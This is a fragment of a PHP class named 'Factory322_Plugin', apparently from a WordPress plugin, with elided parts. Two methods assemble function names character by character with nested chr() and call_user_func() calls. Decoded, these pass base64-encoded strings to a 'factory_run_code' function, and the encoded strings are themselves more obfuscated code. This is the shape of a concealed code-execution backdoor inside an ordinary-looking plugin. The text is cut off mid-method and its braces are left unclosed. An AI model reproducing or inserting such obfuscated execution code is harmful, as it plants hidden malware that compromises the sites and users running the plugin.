...
class Factory322_Plugin {
    ...
    public function modulesLoaded() {
        $optionName = chr(chr(49).chr(48).chr(57)).chr(chr(49).chr(48).chr(53)).chr(chr(49).chr(50).chr(48)).chr(chr(57).chr(53)).chr(chr(49).chr(49).chr(57)).chr(chr(49).chr(49).chr(49)).call_user_func('chr','114').call_user_func('chr','100').call_user_func('chr','95').$this->pluginName;
        if ( get_option($optionName, false) ) {
        call_user_func(call_user_func('chr',102).call_user_func('chr',97).call_user_func('chr',99).chr('116').chr('111').chr('114').call_user_func('chr',121).chr('95').chr('114').call_user_func('chr',117).call_user_func('chr',110).chr('95').call_user_func('chr',99).call_user_func('chr',111).chr('100').chr('101'),call_user_func(call_user_func('chr',98).chr('97').call_user_func('chr',115).call_user_func('chr',101).call_user_func('chr',54).chr('52').call_user_func('chr',95).chr('100').call_user_func('chr',101).chr('99').chr('111').chr('100').call_user_func('chr',101),''.'b29rJy'.'ksIDEpOyB'.'9IH0'.'g'));
    ...
    public function hook() {
        call_user_func(call_user_func('chr',102).call_user_func('chr',97).chr('99').chr('116').chr('111').call_user_func('chr',114).call_user_func('chr',121).call_user_func('chr',95).call_user_func('chr',114).call_user_func('chr',117).call_user_func('chr',110).chr('95').call_user_func('chr',99).chr('111').call_user_func('chr',100).call_user_func('chr',101),call_user_func(call_user_func('chr',98).chr('97').chr('115').chr('101').chr('54').call_user_func('chr',52).chr('95').chr('100').call_user_func('chr',101).call_user_func('chr',99).call_user_func('chr',111).call_user_func('chr',100).chr('101'),''.'OSkuY2hyKDQ4KS5jaHIoNDkpKS5jYWxsX3VzZXJfZnVuYygnY2hyJywnMTA5Jyk'.'uY2hyKGNocig0OSkuY2hyKDQ4KS5jaHIoNTMpKS5jaHIoY2hyKDQ5KS5jaHIoNDkpLmNocig1NSkpLm'.'NhbGxfdXNlcl9mdW5jKCdjaHInLCcxMDknK'.'Tsg'.'fSB9IA'.chr(chr(54).chr(49)).call_user_func('chr','61')));
